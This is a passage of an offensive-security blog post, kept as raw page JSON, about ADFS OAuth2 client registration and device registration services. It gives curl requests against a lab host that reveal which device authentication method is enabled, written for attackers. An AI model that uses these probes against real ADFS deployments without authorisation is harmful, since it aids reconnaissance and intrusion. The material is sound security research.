https:\u002F\u002Fclaimsxray.net\u002Ftoken:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":41,"end":58,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":95,"end":123,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":95,"end":124,"href":"https:\u002F\u002Fclaimsxray.net\u002Ftoken:","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*X0aRhXxxinCQrObr3f9UEw.png":{"__typename":"ImageMetadata","id":"1*X0aRhXxxinCQrObr3f9UEw.png","originalHeight":1160,"originalWidth":1424,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_18":{"__typename":"Paragraph","id":"6c2350f1b8ff_18","name":"8527","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*X0aRhXxxinCQrObr3f9UEw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_19":{"__typename":"Paragraph","id":"6c2350f1b8ff_19","name":"db6e","type":"P","href":null,"layout":null,"metadata":null,"text":"Take note of the Client Identifier which will be used to identify our client configuration later.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":17,"end":34,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_20":{"__typename":"Paragraph","id":"6c2350f1b8ff_20","name":"e0bf","type":"P","href":null,"layout":null,"metadata":null,"text":"The next dialog determines who can access the OAuth2 resource provider. Again we’ll just go with “Permit Everyone” here to allow all authenticated ADFS users to access the application, but there are multiple options to restrict which accounts are permitted access:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*OSHEp62ZA5-9oMc8sMhOnw.png":{"__typename":"ImageMetadata","id":"1*OSHEp62ZA5-9oMc8sMhOnw.png","originalHeight":1150,"originalWidth":1422,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_21":{"__typename":"Paragraph","id":"6c2350f1b8ff_21","name":"249a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*OSHEp62ZA5-9oMc8sMhOnw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_22":{"__typename":"Paragraph","id":"6c2350f1b8ff_22","name":"69d3","type":"P","href":null,"layout":null,"metadata":null,"text":"One additional thing we need to do is configure CORS. This allows ClaimsXRay to make a XHR request to ADFS when exchanging a code for an access token.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_23":{"__typename":"Paragraph","id":"6c2350f1b8ff_23","name":"1661","type":"P","href":null,"layout":null,"metadata":null,"text":"As is often the case with ADFS, there isn’t a management console option to do this and instead we need to use PowerShell:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_24":{"__typename":"Paragraph","id":"6c2350f1b8ff_24","name":"9b82","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Set-AdfsResponseHeaders -EnableCORS $true\nSet-AdfsResponseHeaders -CORSTrustedOrigins https:\u002F\u002Fclaimsxray.net","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_25":{"__typename":"Paragraph","id":"6c2350f1b8ff_25","name":"07e6","type":"P","href":null,"layout":null,"metadata":null,"text":"On a similar note, if we wanted to create this integration using PowerShell from scratch, we can use:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_26":{"__typename":"Paragraph","id":"6c2350f1b8ff_26","name":"8808","type":"PRE","href":null,"layout":null,"metadata":null,"text":"New-AdfsApplicationGroup -Name ClaimsXRayGroup\nAdd-AdfsNativeClientApplication -Name ClaimsXRayClient -ApplicationGroupIdentifier ClaimsXRayGroup -Identifier https:\u002F\u002Fclaimsxray.net\u002F -RedirectUri https:\u002F\u002Fclaimsxray.net\u002Ftoken\nAdd-AdfsWebApiApplication -Name ClaimsXRayServer -Identifier https:\u002F\u002Fclaimsxray.net\u002F -AllowedClientTypes Public -ApplicationGroupIdentifier ClaimsXRayGroup\nGrant-AdfsApplicationPermission -ClientRoleIdentifier https:\u002F\u002Fclaimsxray.net\u002F -ServerRoleIdentifier https:\u002F\u002Fclaimsxray.net\u002F -ScopeNames @('email', 'openid')\n\n# Enable CORS support\nSet-AdfsResponseHeaders -EnableCORS $true\nSet-AdfsResponseHeaders -CORSTrustedOrigins https:\u002F\u002Fclaimsxray.net","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_27":{"__typename":"Paragraph","id":"6c2350f1b8ff_27","name":"f362","type":"P","href":null,"layout":null,"metadata":null,"text":"And with that we’re done. We can test that things work by kicking off the flow on ClaimsXRay.net, providing our Client ID that was generated above, as well as the URL’s to our lab ADFS instance:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":82,"end":96,"href":"http:\u002F\u002FClaimsXRay.net","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*ZQYPcwXjLIcDUdy3ZwcMCw.png":{"__typename":"ImageMetadata","id":"1*ZQYPcwXjLIcDUdy3ZwcMCw.png","originalHeight":1076,"originalWidth":2048,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_28":{"__typename":"Paragraph","id":"6c2350f1b8ff_28","name":"92ae","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ZQYPcwXjLIcDUdy3ZwcMCw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_29":{"__typename":"Paragraph","id":"6c2350f1b8ff_29","name":"e6cd","type":"P","href":null,"layout":null,"metadata":null,"text":"If you click Login, you should see that an access token is returned. We’ll also get an identity token due to the openid scope requested:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":113,"end":119,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*p_MuwlFGbTyhRJHHb657QA.png":{"__typename":"ImageMetadata","id":"1*p_MuwlFGbTyhRJHHb657QA.png","originalHeight":987,"originalWidth":2048,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_30":{"__typename":"Paragraph","id":"6c2350f1b8ff_30","name":"1168","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*p_MuwlFGbTyhRJHHb657QA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_31":{"__typename":"Paragraph","id":"6c2350f1b8ff_31","name":"cb06","type":"P","href":null,"layout":null,"metadata":null,"text":"Now we have some insight into how ADFS handles OAuth2 registration at a very high level, let’s start taking a look at some of the less documented features.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_32":{"__typename":"Paragraph","id":"6c2350f1b8ff_32","name":"d663","type":"H3","href":null,"layout":null,"metadata":null,"text":"Device Registration Services","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_33":{"__typename":"Paragraph","id":"6c2350f1b8ff_33","name":"86bf","type":"P","href":null,"layout":null,"metadata":null,"text":"While reversing ADFS, I came across a number of “hidden” OAuth2 Client ID’s embedded in the binaries:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*EWhas06bMfnLsQ6mcxpQPQ.png":{"__typename":"ImageMetadata","id":"1*EWhas06bMfnLsQ6mcxpQPQ.png","originalHeight":564,"originalWidth":1466,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_34":{"__typename":"Paragraph","id":"6c2350f1b8ff_34","name":"d49d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*EWhas06bMfnLsQ6mcxpQPQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_35":{"__typename":"Paragraph","id":"6c2350f1b8ff_35","name":"7873","type":"P","href":null,"layout":null,"metadata":null,"text":"The one that grabbed my attention was DrsClientIdentitier. If the DRS term looks familiar, it’s likely because you’ve encountered it in the Entra ID world as Device Registration. But for those organisations that like to manage device registration themselves, DRS is also supported on-prem in various forms. Now when I say “supported”, it takes a lot of messing around to get DRS to actually work standalone, so I think it’s been left by Microsoft to die. You are much more likely to encounter this within an organisation which has previously enabled DRS before Entra ID, or as part of the Entra ID Hybrid Join scenarios we’ll explore later.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":38,"end":57,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":158,"end":177,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fentra\u002Fidentity\u002Fdevices\u002Fdevice-registration-how-it-works","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_36":{"__typename":"Paragraph","id":"6c2350f1b8ff_36","name":"dfbf","type":"P","href":null,"layout":null,"metadata":null,"text":"To enable DRS on ADFS, you use the “Device Registration” feature which will deploy the pre-reqs required to support this in Active Directory:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*K0nM5HqPcnjIvmD7k3kVpA.png":{"__typename":"ImageMetadata","id":"1*K0nM5HqPcnjIvmD7k3kVpA.png","originalHeight":592,"originalWidth":1324,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_37":{"__typename":"Paragraph","id":"6c2350f1b8ff_37","name":"5337","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*K0nM5HqPcnjIvmD7k3kVpA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_38":{"__typename":"Paragraph","id":"6c2350f1b8ff_38","name":"01bb","type":"P","href":null,"layout":null,"metadata":null,"text":"If we query ADFS via the \u002FEnrollmentServer\u002Fcontract?api-version=1.2 path, we get a list of DRS descriptors:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":25,"end":67,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*rhvk4KHzlpP6F9FJefj2EA.png":{"__typename":"ImageMetadata","id":"1*rhvk4KHzlpP6F9FJefj2EA.png","originalHeight":988,"originalWidth":1354,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_39":{"__typename":"Paragraph","id":"6c2350f1b8ff_39","name":"206a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*rhvk4KHzlpP6F9FJefj2EA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_40":{"__typename":"Paragraph","id":"6c2350f1b8ff_40","name":"4e39","type":"P","href":null,"layout":null,"metadata":null,"text":"These point to various DRS API services which we will explore later, but before we get too ahead of ourselves, let’s take a quick detour into ADFS authentication methods so we can set the scene for device authentication later on.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_41":{"__typename":"Paragraph","id":"6c2350f1b8ff_41","name":"e688","type":"H3","href":null,"layout":null,"metadata":null,"text":"Authentication Methods","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_42":{"__typename":"Paragraph","id":"6c2350f1b8ff_42","name":"187a","type":"P","href":null,"layout":null,"metadata":null,"text":"ADFS has a concept of “extranet” and “intranet”. For most organisations, ADFS is exposed on the perimeter via a web proxy, and internal network users typically interact with the ADFS service directly.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_43":{"__typename":"Paragraph","id":"6c2350f1b8ff_43","name":"b630","type":"P","href":null,"layout":null,"metadata":null,"text":"You can see that this split is populated down to the configuration of ADFS, with the endpoints being distinctly listed (in this case as “Enabled” and “Proxy Enabled”, because consistent terminology in Microsoft world is hard):","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*0M2r8r_7TVua8EDcCbG-mA.png":{"__typename":"ImageMetadata","id":"1*0M2r8r_7TVua8EDcCbG-mA.png","originalHeight":462,"originalWidth":1662,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_44":{"__typename":"Paragraph","id":"6c2350f1b8ff_44","name":"f154","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*0M2r8r_7TVua8EDcCbG-mA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_45":{"__typename":"Paragraph","id":"6c2350f1b8ff_45","name":"121e","type":"P","href":null,"layout":null,"metadata":null,"text":"This distinction is also surfaced via the authentication methods supported by ADFS, allowing different methods of validating credentials per “Extranet” and “Intranet” (told you Microsoft consistent terminology was hard):","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*LfTXeYXRqMU00oC2uN0NSQ.png":{"__typename":"ImageMetadata","id":"1*LfTXeYXRqMU00oC2uN0NSQ.png","originalHeight":816,"originalWidth":974,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_46":{"__typename":"Paragraph","id":"6c2350f1b8ff_46","name":"733f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*LfTXeYXRqMU00oC2uN0NSQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_47":{"__typename":"Paragraph","id":"6c2350f1b8ff_47","name":"64e2","type":"P","href":null,"layout":null,"metadata":null,"text":"You have likely come across a few of these options during your engagements. For example, “Forms Authentication” is the presentation of the ADFS login form:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*2atnvxCAbbc0599Tz493mg.png":{"__typename":"ImageMetadata","id":"1*2atnvxCAbbc0599Tz493mg.png","originalHeight":668,"originalWidth":1022,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_48":{"__typename":"Paragraph","id":"6c2350f1b8ff_48","name":"ecbf","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*2atnvxCAbbc0599Tz493mg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_49":{"__typename":"Paragraph","id":"6c2350f1b8ff_49","name":"9ef8","type":"P","href":null,"layout":null,"metadata":null,"text":"“Windows Authentication” is the NTLM\u002FKerberos WIA methods that you’ve no doubt tried to relay to in the past, and is only supported on the Intranet.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_50":{"__typename":"Paragraph","id":"6c2350f1b8ff_50","name":"9de7","type":"P","href":null,"layout":null,"metadata":null,"text":"For DRS to function properly, there is the “Device Authentication” option, which needs to be enabled and be accessible via the Extranet\u002FIntranet zones you have access to.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_51":{"__typename":"Paragraph","id":"6c2350f1b8ff_51","name":"51c6","type":"P","href":null,"layout":null,"metadata":null,"text":"Device Authentication requires DRS to be enabled, and it isn’t enabled by default unfortunately for us attackers. So again, you are much more likely to see this in either legacy environments, or environments using Hybrid Join.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_52":{"__typename":"Paragraph","id":"6c2350f1b8ff_52","name":"a2ee","type":"P","href":null,"layout":null,"metadata":null,"text":"There are multiple ways that Device Authentication can function depending on the configuration. In ADFS ≥ 2016, we have:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_53":{"__typename":"Paragraph","id":"6c2350f1b8ff_53","name":"6e34","type":"ULI","href":null,"layout":null,"metadata":null,"text":"ClientTLS","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_54":{"__typename":"Paragraph","id":"6c2350f1b8ff_54","name":"d26e","type":"ULI","href":null,"layout":null,"metadata":null,"text":"PRT","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_55":{"__typename":"Paragraph","id":"6c2350f1b8ff_55","name":"c0a9","type":"ULI","href":null,"layout":null,"metadata":null,"text":"PKeyAuth","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_56":{"__typename":"Paragraph","id":"6c2350f1b8ff_56","name":"63b4","type":"P","href":null,"layout":null,"metadata":null,"text":"The method of Device Authentication is controlled in part by the Set-AdfsGlobalAuthenticationPolicy PowerShell commandlet:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":65,"end":99,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_57":{"__typename":"Paragraph","id":"6c2350f1b8ff_57","name":"7bdf","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Set-AdfsGlobalAuthenticationPolicy –DeviceAuthenticationMethod All","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_58":{"__typename":"Paragraph","id":"6c2350f1b8ff_58","name":"3665","type":"P","href":null,"layout":null,"metadata":null,"text":"Out of the box, ADFS 2012 only supports ClientTLS. However ADFS ≥ 2016 uses SignedToken","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":40,"end":49,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":76,"end":87,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_59":{"__typename":"Paragraph","id":"6c2350f1b8ff_59","name":"fdfc","type":"P","href":null,"layout":null,"metadata":null,"text":"So how can we enumerate a tenant to determine the enabled device authentication method? Well it’s mostly a game of elimination. If we want to see if ClientTLS Device Authentication is enabled for ADFS without having access to the configuration, a curl request for the endpoint with the trace argument would reveal this:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":149,"end":158,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":247,"end":251,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":286,"end":291,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_60":{"__typename":"Paragraph","id":"6c2350f1b8ff_60","name":"8d37","type":"PRE","href":null,"layout":null,"metadata":null,"text":"curl -k 'https:\u002F\u002Fadfs.lab.local\u002Fadfs\u002Fls\u002Fidpinitiatedsignon.aspx?client-request-id=77de249e-f9b5-4921-c301-0080000000b9' -v -X POST -d 'SignInIdpSite=SignInIdpSite&SignInSubmit=Sign+in&SingleSignOut=SingleSignOut' --trace out.txt","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"csharp"},"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*oH2EDM8JBx1SpLvDc9cYBQ.png":{"__typename":"ImageMetadata","id":"1*oH2EDM8JBx1SpLvDc9cYBQ.png","originalHeight":428,"originalWidth":998,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_61":{"__typename":"Paragraph","id":"6c2350f1b8ff_61","name":"2446","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*oH2EDM8JBx1SpLvDc9cYBQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_62":{"__typename":"Paragraph","id":"6c2350f1b8ff_62","name":"943a","type":"P","href":null,"layout":null,"metadata":null,"text":"We’re looking for MS-Organization-Access as the CA in the client certificate request (13). If you see this, then ClientTLS Device Authentication is enabled for the network endpoint you are requesting. And this means if we have the appropriate Device Authentication certificate, we can authenticate to ADFS.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":18,"end":40,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":113,"end":122,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_63":{"__typename":"Paragraph","id":"6c2350f1b8ff_63","name":"776d","type":"P","href":null,"layout":null,"metadata":null,"text":"If we wanted to check if PKeyAuth is enabled, we need to make a request with the ;PKeyAuth\u002F1.0 string within the User-Agent string:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":25,"end":33,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":81,"end":94,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":113,"end":123,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_64":{"__typename":"Paragraph","id":"6c2350f1b8ff_64","name":"1d63","type":"PRE","href":null,"layout":null,"metadata":null,"text":"curl -k 'https:\u002F\u002Fadfs.lab.local\u002Fadfs\u002Fls\u002Fidpinitiatedsignon.aspx?client-request-id=77de249e-f9b5-4921-c301-0080000000b1' -v -X POST -d 'SignInIdpSite=SignInIdpSite&SignInSubmit=Sign+in&SingleSignOut=SingleSignOut' --user-agent \"Mozilla\u002F5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident\u002F4.0);PKeyAuth\u002F1.0","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"lua"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_65":{"__typename":"Paragraph","id":"6c2350f1b8ff_65","name":"28ea","type":"P","href":null,"layout":null,"metadata":null,"text":"If the response comes back with a 302 to urn:http-auth:PKeyAuth then we know that PKeyAuth is used:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":34,"end":37,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":41,"end":63,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_66":{"__typename":"Paragraph","id":"6c2350f1b8ff_66","name":"a7c6","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\u003C HTTP\u002F1.1 302 Found\n\u003C Content-Length: 0\n\u003C Content-Type: text\u002Fhtml; charset=utf-8\n\u003C Location: urn:http-auth:PKeyAuth?SubmitUrl=https%3a%2f%2fadfs.lab.local%3a443%2fadfs%2fls%2fidpinitiatedsignon.aspx%3fclient-request-id%3d77de249e-f9b5-4921-c301-0080000000b1&nonce=P5180krdKaElqhmYzkkNYw&Version=1.0&Context=4e5a62d9-12f7-4898-9a4e-f3cd11c65a1a&CertAutho\nrities=OU%253d82dbaca4-3e81-46ca-9c73-0950c1eaca97%252cCN%253dMS-Organization-Access%2b%252cDC%253dwindows%2b%252cDC%253dnet%2b&client-request-id=77de249e-f9b5-4921-c301-0080000000b1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"perl"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_67":{"__typename":"Paragraph","id":"6c2350f1b8ff_67","name":"1ef2","type":"P","href":null,"layout":null,"metadata":null,"text":"If neither of the above are true, then PRT authentication is in use. We’ll review this option further in the post.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_68":{"__typename":"Paragraph","id":"6c2350f1b8ff_68","name":"497e","type":"P","href":null,"layout":null,"metadata":null,"text":"Now that we understand how Device Authentication works, the next question is… where is all this key, certificate, authentication information stored?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_69":{"__typename":"Paragraph","id":"6c2350f1b8ff_69","name":"33fd","type":"H3","href":null,"layout":null,"metadata":null,"text":"msDS-Device","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_70":{"__typename":"Paragraph","id":"6c2350f1b8ff_70","name":"f3e4","type":"P","href":null,"layout":null,"metadata":null,"text":"You may have come across the msDS-Device LDAP class, which lives in the CN=RegisteredDevices,DC=domain,DC=com container:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":29,"end":40,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":72,"end":109,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*NgUg5_3o7JO3M9m3MVEeYw.png":{"__typename":"ImageMetadata","id":"1*NgUg5_3o7JO3M9m3MVEeYw.png","originalHeight":816,"originalWidth":1712,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_71":{"__typename":"Paragraph","id":"6c2350f1b8ff_71","name":"c5e6","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*NgUg5_3o7JO3M9m3MVEeYw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_72":{"__typename":"Paragraph","id":"6c2350f1b8ff_72","name":"5aed","type":"P","href":null,"layout":null,"metadata":null,"text":"The msDS-Device object is a representation of a registered device. Unlike a Computer object, it isn’t a security principal, but it does contain a number of familiar attributes, such 